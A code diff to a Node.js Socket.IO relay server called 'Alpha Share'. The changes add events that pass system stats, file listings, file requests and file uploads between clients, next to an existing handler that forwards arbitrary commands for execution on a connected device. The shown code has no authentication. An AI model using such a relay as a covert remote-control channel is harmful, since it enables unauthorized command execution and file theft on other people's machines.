@@ -9,7 +9,7 @@ const app = express();
 const server = http.createServer(app);
 
 // Render يستخدم المنفذ من متغير البيئة
-const PORT = process.env.PORT || 10000;
+const PORT = process.env.PORT || 3000;
 
 const io = socketIo(server, {
   cors: {
@@ -38,12 +38,7 @@ app.use((req, res, next) => {
 
 // routes
 app.get('/', (req, res) => {
-  res.json({ 
-    message: 'Alpha Share Server is running on Render',
-    status: 'OK',
-    timestamp: new Date().toISOString(),
-    port: PORT
-  });
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/health', (req, res) => {
@@ -51,7 +46,8 @@ app.get('/health', (req, res) => {
     status: 'healthy',
     server: 'Alpha Share on Render',
     version: '1.0.0',
-    connections: activeConnections.size
+    connections: activeConnections.size,
+    port: PORT
   });
 });
 
@@ -106,12 +102,39 @@ io.on('connection', (socket) => {
     }
   });
   
-  // باقي events تبقى كما هي
   socket.on('control-command', (data) => {
     const { uuid, command, parameters } = data;
     if (activeConnections.has(uuid)) {
       activeConnections.get(uuid).lastActivity = new Date();
       socket.to(uuid).emit('execute-command', { command, parameters });
+    }
+  });
+  
+  socket.on('system-stats', (data) => {
+    const { uuid, stats } = data;
+    if (activeConnections.has(uuid)) {
+      socket.to(uuid).emit('system-stats', { stats });
+    }
+  });
+  
+  socket.on('file-list', (data) => {
+    const { uuid, files } = data;
+    if (activeConnections.has(uuid)) {
+      socket.to(uuid).emit('file-list', { files });
+    }
+  });
+  
+  socket.on('request-file', (data) => {
+    const { uuid, fileName } = data;
+    if (activeConnections.has(uuid)) {
+      socket.to(uuid).emit('send-file', { fileName });
+    }
+  });
+  
+  socket.on('upload-file', (data) => {
+    const { uuid, fileName, fileData } = data;
+    if (activeConnections.has(uuid)) {
+      socket.to(uuid).emit('receive-file', { fileName, fileData });
     }
   });
   
